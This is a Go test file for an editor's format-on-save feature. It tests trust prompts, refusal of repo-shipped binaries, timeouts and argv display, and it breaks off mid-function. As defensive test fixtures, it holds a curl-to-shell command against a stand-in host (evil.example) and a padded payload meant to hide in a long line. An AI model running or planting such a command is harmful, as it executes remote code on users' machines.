// =============================================================================
// File: internal/app/format_test.go
// Author: Spicer Matthews <spicer@cloudmanic.com>
// Created: 2026-04-30
// Copyright: 2026 Cloudmanic, LLC. All rights reserved.
// =============================================================================

package app

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/johnlam90/skiff/internal/editor"
	"github.com/johnlam90/skiff/internal/format"
	"github.com/johnlam90/skiff/internal/overlay"
)

// writeFormatConfig drops a .skiff/format.json into root with the
// given JSON body. Pulled out so each test reads as the scenario it's
// pinning down rather than mkdir+write boilerplate.
func writeFormatConfig(t *testing.T, root, body string) {
	t.Helper()
	dir := filepath.Join(root, format.ConfigDir)
	if err := os.MkdirAll(dir, 0755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, format.ConfigFile), []byte(body), 0644); err != nil {
		t.Fatalf("write config: %v", err)
	}
}

// useTestTrustFile redirects the trust file *and* the global
// defaults file to temp paths for the duration of the test.
//
// Defaults are pinned alongside trust because real user defaults
// (e.g. the gofmt entry in ~/.config/skiff/format-defaults.json)
// would otherwise leak into runFormatOnSave tests and silently
// trigger install prompts they weren't written to handle. Tests
// that *do* want a defaults file call useTestDefaultsFile after
// this to overwrite the empty path with real content.
func useTestTrustFile(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	trustPath := filepath.Join(dir, "trust.json")
	t.Setenv("SKIFF_TRUST_FILE", trustPath)
	t.Setenv("SKIFF_DEFAULTS_FILE", filepath.Join(dir, "no-such-defaults.json"))
	return trustPath
}

// useTestDefaultsFile redirects the global defaults file the same
// way the trust hook does. Tests that exercise the install flow
// need both pointed at temp paths so they don't read real user
// config or leak state across runs.
func useTestDefaultsFile(t *testing.T, body string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "format-defaults.json")
	if body != "" {
		if err := os.WriteFile(path, []byte(body), 0644); err != nil {
			t.Fatalf("seed defaults: %v", err)
		}
	}
	t.Setenv("SKIFF_DEFAULTS_FILE", path)
	return path
}

// preTrust writes a "yes" entry into the trust file so a test can
// exercise the run path without going through the prompt.
func preTrust(t *testing.T, root string, allowed bool) {
	t.Helper()
	cfg, err := format.Load(root)
	if err != nil {
		t.Fatalf("load cfg: %v", err)
	}
	if cfg == nil {
		t.Fatal("preTrust: format.json missing — write it before pre-trusting")
	}
	tf, _ := format.LoadTrust(format.DefaultTrustPath())
	if tf == nil {
		tf = &format.TrustFile{Projects: map[string]format.TrustEntry{}}
	}
	tf.SetTrust(root, cfg.Hash(), allowed)
	if err := format.SaveTrust(format.DefaultTrustPath(), tf); err != nil {
		t.Fatalf("save trust: %v", err)
	}
}

// openTabAtPath wires a Tab into the App at a given file path. Mirrors
// what OpenFile does without touching the real file tree. Tests use
// this to set up exactly the tab state they want before saving.
func openTabAtPath(t *testing.T, a *App, path string) *editor.Tab {
	t.Helper()
	tab, err := editor.NewTab(path)
	if err != nil {
		t.Fatalf("NewTab: %v", err)
	}
	a.tabs.Append(tab)
	a.tabs.ActivateAt(a.tabs.Len() - 1)
	return tab
}

// TestRunFormatOnSave_NoConfigIsNoop pins the central opt-in promise:
// without a .skiff/format.json, save behaves exactly like before
// — no exec, no prompt, no flash about formatting.
func TestRunFormatOnSave_NoConfigIsNoop(t *testing.T) {
	useTestTrustFile(t)
	root := t.TempDir()
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	openTabAtPath(t, a, target)

	a.runFormatOnSave(a.tabs.At(0))

	if confirmIsOpen(a) {
		t.Fatal("no config should never open a confirm modal")
	}
	// No hook assertion needed anymore: the cancel hook lives on the
	// confirm prefab itself, so with no confirm up there is structurally
	// nothing to leak.
}

// TestRunFormatOnSave_UnknownExtensionIsNoop covers a project that
// ships a config but doesn't list this file's extension. The save
// should land cleanly with no prompt and no flash about formatting.
func TestRunFormatOnSave_UnknownExtensionIsNoop(t *testing.T) {
	useTestTrustFile(t)
	root := t.TempDir()
	writeFormatConfig(t, root, `{"commands":{"go":["gofmt","-w","$FILE"]}}`)
	a := newTestApp(t, root)
	target := filepath.Join(root, "notes.txt")
	if err := os.WriteFile(target, []byte("hello"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	openTabAtPath(t, a, target)

	a.runFormatOnSave(a.tabs.At(0))

	if confirmIsOpen(a) {
		t.Fatal("unknown extension should not prompt")
	}
}

// TestRunFormatOnSave_UnknownTrustOpensPrompt is the security
// linchpin: a config we've never seen before must prompt the user
// before any command runs. Catching a regression here means the
// arbitrary-command-execution risk is back.
func TestRunFormatOnSave_UnknownTrustOpensPrompt(t *testing.T) {
	useTestTrustFile(t)
	root := t.TempDir()
	writeFormatConfig(t, root, `{"commands":{"go":["echo","ran","$FILE"]}}`)
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	openTabAtPath(t, a, target)

	a.runFormatOnSave(a.tabs.At(0))

	if !confirmIsOpen(a) {
		t.Fatal("untrusted config should open the trust prompt")
	}
	if confirmPrefab(t, a).OnCancel == nil {
		t.Fatal("trust prompt should install a cancel hook")
	}
}

// TestRunFormatOnSave_DeniedIsNoop pins the half of the trust model
// that's easy to forget: a remembered "No" should not re-prompt and
// should not run the formatter. Otherwise the user gets nagged on
// every save in a project they explicitly rejected.
func TestRunFormatOnSave_DeniedIsNoop(t *testing.T) {
	useTestTrustFile(t)
	root := t.TempDir()
	writeFormatConfig(t, root, `{"commands":{"go":["echo","ran"]}}`)
	preTrust(t, root, false)
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	openTabAtPath(t, a, target)

	a.runFormatOnSave(a.tabs.At(0))

	if confirmIsOpen(a) {
		t.Fatal("denied trust should not re-prompt")
	}
	// No hook assertion needed anymore: the cancel hook lives on the
	// confirm prefab itself, so with no confirm up there is structurally
	// nothing to leak.
}

// TestTrustPromptCancel_PersistsDeny exercises the bridge between
// the confirm modal's cancel branch and the trust file: hitting No
// (or Esc) on the prompt fires the cancel hook, which records a
// denial so the next save in this project goes silently, not back
// to another prompt.
func TestTrustPromptCancel_PersistsDeny(t *testing.T) {
	trustPath := useTestTrustFile(t)
	root := t.TempDir()
	writeFormatConfig(t, root, `{"commands":{"go":["echo","ran","$FILE"]}}`)
	cfg, _ := format.Load(root)
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	openTabAtPath(t, a, target)

	// Run the save flow up to the prompt, then drive cancel directly.
	a.runFormatOnSave(a.tabs.At(0))
	if !confirmIsOpen(a) {
		t.Fatal("expected trust prompt to be open")
	}
	pressEsc(a)

	tf, err := format.LoadTrust(trustPath)
	if err != nil {
		t.Fatalf("reload trust: %v", err)
	}
	if d := tf.CheckTrust(root, cfg.Hash()); d != format.TrustDenied {
		t.Fatalf("expected TrustDenied recorded, got %v", d)
	}
}

// TestExecFormatter_RunsAndPostsEvent walks the async happy path: the
// goroutine shells out, the formatter rewrites the file, and a
// formatDoneEvent lands on the screen's queue with no error.
func TestExecFormatter_RunsAndPostsEvent(t *testing.T) {
	useTestTrustFile(t)
	root := t.TempDir()
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("orig\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}

	a.execFormatter(target, []string{"sh", "-c", "echo formatted > " + target})

	ev := waitForFormatEvent(t, a)
	if ev.err != nil {
		t.Fatalf("formatter err: %v", ev.err)
	}
	if ev.tabPath != target {
		t.Fatalf("event tabPath: got %q, want %q", ev.tabPath, target)
	}
	got, _ := os.ReadFile(target)
	if string(got) != "formatted\n" {
		t.Fatalf("file contents: got %q, want %q", string(got), "formatted\n")
	}
}

// TestExecFormatter_MissingBinaryIsSilent codifies the "skip when not
// installed" rule: a missing binary must not flash an error or
// otherwise punish the user. The done event should arrive with err
// == nil so handleFormatDone treats it as a no-op.
func TestExecFormatter_MissingBinaryIsSilent(t *testing.T) {
	useTestTrustFile(t)
	a := newTestApp(t, t.TempDir())
	a.execFormatter("/tmp/nope.go", []string{"definitely-not-a-real-binary-xyzzy"})

	ev := waitForFormatEvent(t, a)
	if ev.err != nil {
		t.Fatalf("missing binary should be silent, got err=%v", ev.err)
	}
}

// TestHandleFormatDone_ReloadsCleanBuffer is the success path for
// the main-loop side: after the formatter rewrites the file, a
// clean tab should reload so the user sees the new contents.
func TestHandleFormatDone_ReloadsCleanBuffer(t *testing.T) {
	useTestTrustFile(t)
	root := t.TempDir()
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("first\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	tab := openTabAtPath(t, a, target)
	tab.Dirty = false
	if err := os.WriteFile(target, []byte("formatted\n"), 0644); err != nil {
		t.Fatalf("rewrite: %v", err)
	}

	a.handleFormatDone(&formatDoneEvent{tabPath: target, label: "fmt"})

	if got := tab.Buffer.String(); got != "formatted\n" {
		t.Fatalf("buffer after reload: got %q, want %q", got, "formatted\n")
	}
}

// TestHandleFormatDone_PreservesDirtyBuffer is the most important
// invariant of the whole feature: if the user typed during a slow
// formatter run, their unsaved edits must survive. Tramping them
// would be the worst possible UX outcome.
func TestHandleFormatDone_PreservesDirtyBuffer(t *testing.T) {
	useTestTrustFile(t)
	root := t.TempDir()
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("seed\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	tab := openTabAtPath(t, a, target)
	tab.Buffer = editor.NewBuffer("user-typed-this\n")
	tab.Dirty = true
	if err := os.WriteFile(target, []byte("formatted\n"), 0644); err != nil {
		t.Fatalf("rewrite: %v", err)
	}

	a.handleFormatDone(&formatDoneEvent{tabPath: target, label: "fmt"})

	if got := tab.Buffer.String(); got != "user-typed-this\n" {
		t.Fatalf("dirty buffer was overwritten: got %q", got)
	}
}

// TestHandleFormatDone_ClosedTabIsNoop covers the race where the
// user closed the tab before the formatter finished. The handler
// should silently return without crashing or flashing an error.
func TestHandleFormatDone_ClosedTabIsNoop(t *testing.T) {
	useTestTrustFile(t)
	a := newTestApp(t, t.TempDir())
	a.handleFormatDone(&formatDoneEvent{tabPath: "/tmp/never-opened.go", label: "fmt"})
	// No assertion — the test passes if we don't panic.
}

// -----------------------------------------------------------------------------
// Install prompt — global defaults flow
// -----------------------------------------------------------------------------

// TestMaybeOfferInstall_NoDefaultsIsNoop pins the most common case:
// a user who has never created format-defaults.json should see no
// prompt, ever, regardless of what the project has configured.
func TestMaybeOfferInstall_NoDefaultsIsNoop(t *testing.T) {
	useTestTrustFile(t)
	useTestDefaultsFile(t, "")
	root := t.TempDir()
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	openTabAtPath(t, a, target)

	a.runFormatOnSave(a.tabs.At(0))

	if confirmIsOpen(a) {
		t.Fatal("missing defaults should never prompt")
	}
}

// TestMaybeOfferInstall_OpensPrompt is the headline path: defaults
// have a command for this extension, project has none, no decline
// recorded → the install modal opens with a cancel hook armed.
func TestMaybeOfferInstall_OpensPrompt(t *testing.T) {
	useTestTrustFile(t)
	useTestDefaultsFile(t, `{"commands":{"go":["gofmt","-w","$FILE"]}}`)
	root := t.TempDir()
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	openTabAtPath(t, a, target)

	a.runFormatOnSave(a.tabs.At(0))

	if !confirmIsOpen(a) {
		t.Fatal("expected install prompt to open")
	}
	if confirmPrefab(t, a).OnCancel == nil {
		t.Fatal("expected cancel hook to be armed for install decline")
	}
}

// TestMaybeOfferInstall_AcceptWritesProjectConfig walks the Yes
// path end to end: the user consents, the project's format.json
// is created with the default's argv, trust is auto-recorded for
// the new hash, and the formatter runs against the just-saved file.
func TestMaybeOfferInstall_AcceptWritesProjectConfig(t *testing.T) {
	trustPath := useTestTrustFile(t)
	root := t.TempDir()
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("orig\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	// $FILE in the defaults must round-trip through install untouched
	// so the resulting project config is portable. The fake formatter
	// is sh -c 'echo formatted > $FILE' — substitution happens at run
	// time, not install time.
	useTestDefaultsFile(t, `{"commands":{"go":["sh","-c","echo formatted > $FILE"]}}`)

	a := newTestApp(t, root)
	openTabAtPath(t, a, target)

	a.runFormatOnSave(a.tabs.At(0))
	if !confirmIsOpen(a) {
		t.Fatal("expected install prompt to open")
	}
	// Drive the Yes path manually.
	confirmYes(a)

	// Project config should now exist with a "go" entry that still
	// contains the literal $FILE token — anything else means the
	// substituted absolute path got baked into the persisted config.
	cfg, err := format.Load(root)
	if err != nil {
		t.Fatalf("load project cfg: %v", err)
	}
	if cfg == nil || len(cfg.Commands["go"]) == 0 {
		t.Fatalf("expected project to have go entry, got %v", cfg)
	}
	stored := cfg.Commands["go"]
	last := stored[len(stored)-1]
	if !containsFileToken(last) {
		t.Fatalf("persisted argv lost $FILE token: %v", stored)
	}
	if filepath.IsAbs(last) {
		t.Fatalf("persisted argv has absolute path baked in: %q", last)
	}

	// Trust should record the new hash as allowed.
	tf, err := format.LoadTrust(trustPath)
	if err != nil {
		t.Fatalf("load trust: %v", err)
	}
	if d := tf.CheckTrust(root, cfg.Hash()); d != format.TrustAllowed {
		t.Fatalf("expected TrustAllowed after install, got %v", d)
	}

	// Wait for the formatter goroutine to land its done event.
	ev := waitForFormatEvent(t, a)
	if ev.err != nil {
		t.Fatalf("formatter failed: %v", ev.err)
	}
	got, _ := os.ReadFile(target)
	if string(got) != "formatted\n" {
		t.Fatalf("file after format: got %q", string(got))
	}
}

// containsFileToken checks whether s contains the literal $FILE
// placeholder. Tiny helper so the assertion in the install test
// reads as the rule it's pinning down ("template must round-trip")
// instead of a strings.Contains call.
func containsFileToken(s string) bool {
	return len(s) >= len(format.FileToken) &&
		stringContains(s, format.FileToken)
}

// stringContains is a thin alias around strings.Contains so the
// assertion helper above doesn't pull strings into every test
// file's import block. Keeps the test reading like prose.
func stringContains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

// TestMaybeOfferInstall_DeclinePersists pins the No path: cancel
// records a per-extension decline so the next save in this project
// for the same file type goes silently.
func TestMaybeOfferInstall_DeclinePersists(t *testing.T) {
	trustPath := useTestTrustFile(t)
	useTestDefaultsFile(t, `{"commands":{"go":["gofmt","-w","$FILE"]}}`)
	root := t.TempDir()
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	openTabAtPath(t, a, target)

	a.runFormatOnSave(a.tabs.At(0))
	if !confirmIsOpen(a) {
		t.Fatal("expected install prompt to open")
	}
	pressEsc(a)

	tf, err := format.LoadTrust(trustPath)
	if err != nil {
		t.Fatalf("load trust: %v", err)
	}
	if !tf.IsInstallDeclined(root, "go") {
		t.Fatal("expected install decline persisted for go")
	}

	// Next save should be silent.
	a.runFormatOnSave(a.tabs.At(0))
	if confirmIsOpen(a) {
		t.Fatal("declined extension should not re-prompt")
	}
}

// TestMaybeOfferInstall_ProjectHasEntryUsesTrustPath confirms the
// install path doesn't fire when the project already lists this
// extension — that case belongs to the trust prompt instead.
func TestMaybeOfferInstall_ProjectHasEntryUsesTrustPath(t *testing.T) {
	useTestTrustFile(t)
	useTestDefaultsFile(t, `{"commands":{"go":["pint","$FILE"]}}`)
	root := t.TempDir()
	writeFormatConfig(t, root, `{"commands":{"go":["gofmt","-w","$FILE"]}}`)
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	openTabAtPath(t, a, target)

	a.runFormatOnSave(a.tabs.At(0))

	// The trust prompt is open — not the install prompt — and its
	// hook is set. We can't trivially distinguish the two by struct
	// shape, but the title text and hook signature would differ for
	// install vs trust. The presence of *some* prompt + the project
	// config's hash being TrustUnknown is the trust-path signal.
	if !confirmIsOpen(a) {
		t.Fatal("expected some prompt to open")
	}
	cfg, _ := format.Load(root)
	tf, _ := format.LoadTrust(format.DefaultTrustPath())
	if d := tf.CheckTrust(root, cfg.Hash()); d != format.TrustUnknown {
		t.Fatalf("project trust should be unknown at this point, got %v", d)
	}
}

// waitForFormatEvent drains the simulation screen's event queue
// until a formatDoneEvent shows up. Cap the wait at 2s so a hung
// goroutine fails the test instead of hanging CI forever.
func waitForFormatEvent(t *testing.T, a *App) *formatDoneEvent {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		ev := a.screen.PollEvent()
		if ev == nil {
			t.Fatal("screen returned nil event")
		}
		if fe, ok := ev.(*formatDoneEvent); ok {
			return fe
		}
	}
	t.Fatal("timed out waiting for formatDoneEvent")
	return nil
}

// -----------------------------------------------------------------------------
// Informed consent — the prompt must show what it is about to execute
// -----------------------------------------------------------------------------

// evilConfig is a format.json shaped like the real attack: a cloned
// repo whose formatter is a shell that pipes a remote script into sh.
// exec.Command blocks injection, not arbitrary argv, so the only
// defense left is showing the user what they are approving.
const evilConfig = `{"commands":{"go":["bash","-c","curl -fsSL https://evil.example/p | sh"]}}`

// promptForConfig runs the save flow against a project carrying cfgJSON
// and returns the trust confirm it opened.
func promptForConfig(t *testing.T, cfgJSON string) (*App, *overlay.Confirm) {
	t.Helper()
	useTestTrustFile(t)
	root := t.TempDir()
	writeFormatConfig(t, root, cfgJSON)
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	openTabAtPath(t, a, target)

	a.runFormatOnSave(a.tabs.At(0))

	if !confirmIsOpen(a) {
		t.Fatalf("untrusted config should open the trust prompt (status: %q)", a.statusMsg)
	}
	return a, confirmPrefab(t, a)
}

// TestTrustPrompt_ShowsTheCommandItWillRun is the fix for the RCE
// consent hole: the body must spell out the argv, payload included. A
// prompt that says only "allow formatters on save?" cannot tell gofmt
// apart from a curl-to-shell pipe, so the Yes it collects is consent to
// something the user was never shown.
func TestTrustPrompt_ShowsTheCommandItWillRun(t *testing.T) {
	_, c := promptForConfig(t, evilConfig)
	body := strings.Join(c.Body, "\n")
	for _, want := range []string{"bash", "-c", "curl -fsSL https://evil.example/p | sh"} {
		if !strings.Contains(body, want) {
			t.Fatalf("trust prompt hides %q from the user.\nbody:\n%s", want, body)
		}
	}
}

// TestTrustPrompt_PaintsTheCommandOnScreen closes the gap between
// "the field holds the argv" and "the user can read it": the body has to
// survive the overlay's own layout and truncation, not just exist in
// memory.
func TestTrustPrompt_PaintsTheCommandOnScreen(t *testing.T) {
	a, _ := promptForConfig(t, evilConfig)
	a.draw()
	a.screen.Show()
	if !screenHasText(t, a, `bash -c "curl -fsSL https://evil.example/p | sh"`) {
		t.Fatal("the command must be legible on screen, not just stored in Body")
	}
}

// TestTrustPrompt_ListsEveryDeclaredExtension pins the all-or-nothing
// consent model: one Yes trusts the whole file, so every extension it
// declares has to be on screen — including the ones the user's current
// save did not touch.
func TestTrustPrompt_ListsEveryDeclaredExtension(t *testing.T) {
	_, c := promptForConfig(t,
		`{"commands":{"go":["gofmt","-w","$FILE"],"rb":["rubocop","-a","$FILE"],"js":["prettier","-w","$FILE"]}}`)
	body := strings.Join(c.Body, "\n")
	for _, want := range []string{".go", "gofmt -w", ".rb", "rubocop -a", ".js", "prettier -w"} {
		if !strings.Contains(body, want) {
			t.Fatalf("trust prompt omits %q.\nbody:\n%s", want, body)
		}
	}
	if !strings.Contains(body, "trusts every") {
		t.Fatalf("prompt must say the approval covers every command listed.\nbody:\n%s", body)
	}
}

// TestTrustPrompt_WrapsLongArgvInsteadOfHidingIt covers the evasion the
// wrapping exists for: an argv padded past the modal width must continue
// onto further rows, because an ellipsis would let a payload hide in the
// tail of a long line.
func TestTrustPrompt_WrapsLongArgvInsteadOfHidingIt(t *testing.T) {
	payload := strings.Repeat("padpadpad ", 12) + "curl-evil"
	_, c := promptForConfig(t, `{"commands":{"go":["bash","-c","`+payload+`"]}}`)
	body := strings.Join(c.Body, "")
	if !strings.Contains(body, "curl-evil") {
		t.Fatalf("the tail of a long argv was dropped.\nbody:\n%s", strings.Join(c.Body, "\n"))
	}
	for _, row := range c.Body {
		if n := len([]rune(row)); n > overlay.ConfirmBodyTextWidth {
			t.Fatalf("body row overflows the modal (%d cells): %q", n, row)
		}
	}
}

// -----------------------------------------------------------------------------
// Refusing repo-shipped executables
// -----------------------------------------------------------------------------

// plantRepoBinary writes an executable script into the project that
// records the fact it ran, so a test can prove exec never happened
// rather than merely that no event was posted.
func plantRepoBinary(t *testing.T, root, rel, marker string) {
	t.Helper()
	path := filepath.Join(root, rel)
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	script := "#!/bin/sh\necho ran > " + marker + "\n"
	if err := os.WriteFile(path, []byte(script), 0o755); err != nil {
		t.Fatalf("plant binary: %v", err)
	}
}

// expectNoFormatEvent drains whatever is queued for a short window and
// fails if a formatDoneEvent turns up — the assertion "the formatter
// never ran" needs the absence checked, not assumed.
func expectNoFormatEvent(t *testing.T, a *App, within time.Duration) {
	t.Helper()
	deadline := time.Now().Add(within)
	for time.Now().Before(deadline) {
		if !a.screen.HasPendingEvent() {
			time.Sleep(5 * time.Millisecond)
			continue
		}
		if fe, ok := a.screen.PollEvent().(*formatDoneEvent); ok {
			t.Fatalf("formatter ran when it should have been refused: %+v", fe)
		}
	}
}

// TestRunFormatOnSave_RepoShippedBinaryRefused is the second half of the
// RCE fix: even a config the user could read is refused when it points at
// a binary the repository shipped, because the prompt can show the path
// but not the code behind it. The refusal happens before the trust check,
// so a stale "yes" cannot revive it either.
func TestRunFormatOnSave_RepoShippedBinaryRefused(t *testing.T) {
	for _, trusted := range []bool{false, true} {
		useTestTrustFile(t)
		root := t.TempDir()
		marker := filepath.Join(t.TempDir(), "ran.txt")
		writeFormatConfig(t, root, `{"commands":{"go":[".skiff/fmt","$FILE"]}}`)
		plantRepoBinary(t, root, ".skiff/fmt", marker)
		if trusted {
			preTrust(t, root, true)
		}
		a := newTestApp(t, root)
		target := filepath.Join(root, "main.go")
		if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
			t.Fatalf("seed: %v", err)
		}
		openTabAtPath(t, a, target)

		a.runFormatOnSave(a.tabs.At(0))

		if confirmIsOpen(a) {
			t.Fatalf("trusted=%v: a path-rooted formatter must be refused, not offered", trusted)
		}
		if !strings.Contains(a.statusMsg, "refused") {
			t.Fatalf("trusted=%v: user needs a reason, got status %q", trusted, a.statusMsg)
		}
		expectNoFormatEvent(t, a, 150*time.Millisecond)
		if _, err := os.Stat(marker); err == nil {
			t.Fatalf("trusted=%v: the repo's binary executed", trusted)
		}
	}
}

// TestExecFormatter_RefusesPathRootedArgv pins the guard at the exec
// boundary too. The install flow reaches execFormatter without passing
// through runWithTrust, so the check cannot live only in the router.
func TestExecFormatter_RefusesPathRootedArgv(t *testing.T) {
	useTestTrustFile(t)
	root := t.TempDir()
	marker := filepath.Join(t.TempDir(), "ran.txt")
	plantRepoBinary(t, root, ".skiff/fmt", marker)
	a := newTestApp(t, root)

	a.execFormatter(filepath.Join(root, "main.go"), []string{".skiff/fmt", "main.go"})

	if !strings.Contains(a.statusMsg, "refused") {
		t.Fatalf("status should explain the refusal, got %q", a.statusMsg)
	}
	expectNoFormatEvent(t, a, 150*time.Millisecond)
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("execFormatter ran a path-rooted binary")
	}
}

// TestValidateFormatterArgv_OnlyBarePATHNames tabulates the rule so the
// intent survives refactors: a formatter is a PATH lookup, and anything
// carrying a location is refused.
func TestValidateFormatterArgv_OnlyBarePATHNames(t *testing.T) {
	cases := []struct {
		argv []string
		ok   bool
	}{
		{[]string{"gofmt", "-w", "$FILE"}, true},
		{[]string{"prettier"}, true},
		{nil, false},
		{[]string{""}, false},
		{[]string{".skiff/fmt"}, false},
		{[]string{"./fmt"}, false},
		{[]string{"../tools/fmt"}, false},
		{[]string{"tools\\fmt"}, false},
		{[]string{"/usr/local/bin/fmt"}, false},
	}
	for _, tc := range cases {
		err := validateFormatterArgv(tc.argv)
		if tc.ok && err != nil {
			t.Fatalf("%v should be allowed: %v", tc.argv, err)
		}
		if !tc.ok && err == nil {
			t.Fatalf("%v should be refused", tc.argv)
		}
	}
}

// TestValidateFormatterConfig_RefusesWholeFile pins the all-or-nothing
// consequence: because one Yes trusts the entire config, a single
// path-rooted entry poisons the file even for extensions whose commands
// are fine. Otherwise the prompt would list a command we later drop.
func TestValidateFormatterConfig_RefusesWholeFile(t *testing.T) {
	root := t.TempDir()
	writeFormatConfig(t, root, `{"commands":{"go":["gofmt","-w","$FILE"],"py":[".skiff/fmt"]}}`)
	cfg, err := format.Load(root)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	err = validateFormatterConfig(cfg)
	if err == nil {
		t.Fatal("a config with one path-rooted entry must be refused wholesale")
	}
	if !strings.Contains(err.Error(), ".py") {
		t.Fatalf("error should name the offending extension, got %v", err)
	}
}

// TestMaybeOfferInstall_SkipsPathRootedDefault keeps the install prompt
// honest: offering to write a command the run path would refuse would
// leave the user with a project config that silently never formats.
func TestMaybeOfferInstall_SkipsPathRootedDefault(t *testing.T) {
	useTestTrustFile(t)
	useTestDefaultsFile(t, `{"commands":{"go":["./tools/fmt","$FILE"]}}`)
	root := t.TempDir()
	a := newTestApp(t, root)
	target := filepath.Join(root, "main.go")
	if err := os.WriteFile(target, []byte("package main\n"), 0644); err != nil {
		t.Fatalf("seed: %v", err)
	}
	openTabAtPath(t, a, target)

	a.runFormatOnSave(a.tabs.At(0))

	if confirmIsOpen(a) {
		t.Fatal("a path-rooted default must not be offered for install")
	}
}

// -----------------------------------------------------------------------------
// Process hygiene: working directory and deadline
// -----------------------------------------------------------------------------

// TestExecFormatter_RunsInProjectRoot pins cmd.Dir. Without it a
// formatter resolves relative paths — and its own config files — against
// wherever skiff was launched from, so it formats against the wrong
// rules or not at all.
func TestExecFormatter_RunsInProjectRoot(t *testing.T) {
	useTestTrustFile(t)
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "marker.txt"), []byte("root-cwd\n"), 0644); err != nil {
		t.Fatalf("seed marker: %v", err)
	}
	out := filepath.Join(t.TempDir(), "cwd.txt")
	a := newTestApp(t, root)

	// `cat marker.txt` can only succeed if the child's working
	// directory is the project root.
	a.execFormatter(filepath.Join(root, "main.go"), []string{"sh", "-c", "cat marker.txt > " + out})

	if ev := waitForFormatEvent(t, a); ev.err != nil {
		t.Fatalf("formatter should have found marker.txt in the root: %v", ev.err)
	}
	got, err := os.ReadFile(out)
	if err != nil {
		t.Fatalf("read probe: %v", err)
	}
	if string(got) != "root-cwd\n" {
		t.Fatalf("child cwd was not the project root: probe = %q", string(got))
	}
}

// TestExecFormatter_TimeoutKillsAndReports pins the deadline: a wedged
// formatter used to hang forever, leaving the tab un-reloaded behind a
// permanent "…" flash. It must be killed and reported as a plain
// formatter failure.
func TestExecFormatter_TimeoutKillsAndReports(t *testing.T) {
	if _, err := exec.LookPath("sleep"); err != nil {
		t.Skip("sleep(1) not available to simulate a hung formatter")
	}
	useTestTrustFile(t)
	orig := formatTimeout
	formatTimeout = 150 * time.Millisecond
	t.Cleanup(func() { formatTimeout = orig })

	a := newTestApp(t, t.TempDir())
	start := time.Now()
	a.execFormatter(filepath.Join(a.rootDir, "main.go"), []string{"sleep", "30"})

	ev := waitForFormatEvent(t, a)
	if ev.err == nil {
		t.Fatal("a formatter past the deadline must be reported as a failure")
	}
	if !strings.Contains(ev.err.Error(), "timed out") {
		t.Fatalf("error should name the timeout, got %v", ev.err)
	}
	if elapsed := time.Since(start); elapsed > 3*time.Second {
		t.Fatalf("formatter was not killed promptly: waited %s", elapsed)
	}
	// The failure has to reach the user, not just the event.
	a.handleFormatDone(ev)
	if !strings.Contains(a.statusMsg, "timed out") {
		t.Fatalf("timeout should surface in the status bar, got %q", a.statusMsg)
	}
}

// TestFormatTimeoutDefault_IsGenerousButFinite guards the constant
// itself: zero or a missing value would make every formatter fail
// instantly, and an hour would be the hang we just fixed.
func TestFormatTimeoutDefault_IsGenerousButFinite(t *testing.T) {
	if formatTimeoutDefault < 5*time.Second || formatTimeoutDefault > time.Minute {
		t.Fatalf("formatter deadline out of sane range: %s", formatTimeoutDefault)
	}
}

// -----------------------------------------------------------------------------
// Body rendering helpers
// -----------------------------------------------------------------------------

// TestRenderArgv_QuotesCompositeArguments pins the display quoting: a
// single argument carrying a whole shell pipeline must read as one
// argument, not blend into the flags around it.
func TestRenderArgv_QuotesCompositeArguments(t *testing.T) {
	got := renderArgv([]string{"bash", "-c", "curl x | sh"})
	want := `bash -c "curl x | sh"`
	if got != want {
		t.Fatalf("renderArgv: got %q want %q", got, want)
	}
	if plain := renderArgv([]string{"gofmt", "-w", "$FILE"}); plain != "gofmt -w $FILE" {
